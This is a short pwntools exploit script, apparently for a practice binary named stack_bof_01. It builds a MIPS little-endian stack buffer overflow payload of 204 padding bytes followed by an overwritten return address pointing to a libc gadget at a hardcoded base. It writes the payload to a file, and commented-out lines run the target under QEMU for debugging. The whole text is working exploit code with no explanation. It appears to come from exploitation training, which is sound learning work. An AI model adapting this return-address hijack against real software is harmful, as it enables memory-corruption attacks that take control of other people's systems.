from pwn import *
context(log_level='debug',arch='mips',endian='little',bits=32)

libc_addr=0x3ffba000
gadget1=0x6B20+libc_addr
payload="a"*204+p32(gadget1)+p32(0x4008e0)
# payload=b"a"*204+p32(0x40095c)

with open("payload","w") as f:
	f.write(payload)
# io=process(b"./q  -L ./ -g 1234 ./stack_bof_01 ".decode()+payload,shell=True)

# io.interactive()
